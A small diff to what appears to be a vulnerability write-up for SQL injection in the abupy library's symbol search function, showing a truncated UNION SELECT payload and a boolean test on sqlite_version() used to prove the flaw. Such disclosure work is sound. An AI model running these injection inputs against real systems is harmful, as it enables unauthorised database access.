@@ -25,7 +25,7 @@ print(abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us10101' union select case
 
 Finally you can find the result is `{'JASNW': 'JASON INDS INC'}`  
 if you replace `sqlite_version() = '3.31.1'` with `sqlite_version() != '3.31.1'`  
-you can find the result is`{'TROVW': 'TROVAGENE INC'}`
+you can find the result is `{'TROVW': 'TROVAGENE INC'}`
 
 proved sql code execution
 
